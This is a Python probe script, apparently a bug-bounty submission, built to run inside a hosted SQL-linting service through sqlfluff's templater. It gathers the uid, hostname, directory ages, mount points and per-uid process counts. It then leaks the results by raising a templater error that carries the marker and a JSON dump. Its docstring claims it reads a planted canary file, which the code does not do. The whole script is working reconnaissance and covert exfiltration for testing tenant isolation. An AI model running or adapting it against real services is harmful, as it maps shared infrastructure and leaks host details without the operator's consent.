MARKER = 'A145F9_R4_1B2047C13A46'
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1).
Reads process-local directory NAMES, and the content of ONE file whose
name this researcher chose and planted. No environment, no network, no
instance metadata, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

try:
    import stat as _st
    out["uid"] = os.getuid()
    out["host"] = __import__("socket").gethostname()
    now = time.time()
    # --- how old is the SHARED scratch root, versus our own run directory? ---
    for lbl, path in (("root", "/"), ("tmp", "/tmp"), ("jobs", "/tmp/jobs")):
        try:
            s = os.stat(path)
            out["age_" + lbl] = int(now - s.st_mtime)
            out["dev_" + lbl] = s.st_dev
        except Exception as exc:
            out["age_" + lbl] = "ERR:" + type(exc).__name__
    try:
        out["dev_cwd"] = os.stat(os.getcwd()).st_dev
    except Exception:
        pass
    # --- is this process in its own mount namespace? mountpoints + fstype only ---
    try:
        mts = []
        with open("/proc/self/mountinfo") as fh:
            for ln in fh:
                f = ln.split()
                try:
                    sep = f.index("-")
                    mts.append([f[4], f[sep + 1]])
                except Exception:
                    continue
        out["n_mounts"] = len(mts)
        out["mounts"] = [m for m in mts if m[0] in ("/", "/tmp", "/tmp/jobs")
                         or m[0].startswith("/tmp/")][:12]
        out["mount_points"] = sorted(set(m[0] for m in mts))[:30]
    except Exception as exc:
        out["mounts_err"] = type(exc).__name__ + ":" + str(exc)[:80]
    # --- is anything else running in this PID namespace? COUNTS ONLY. ---
    try:
        me = os.getuid()
        pids = [e for e in os.listdir("/proc") if e.isdigit()]
        mine_n = 0
        other_n = 0
        for pid in pids:
            try:
                if os.stat("/proc/" + pid).st_uid == me:
                    mine_n += 1
                else:
                    other_n += 1
            except Exception:
                pass
        out["n_pids"] = len(pids)
        out["n_pids_own_uid"] = mine_n
        out["n_pids_other_uid"] = other_n
        out["my_pid_int"] = os.getpid()
    except Exception as exc:
        out["proc_err"] = type(exc).__name__ + ":" + str(exc)[:80]
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
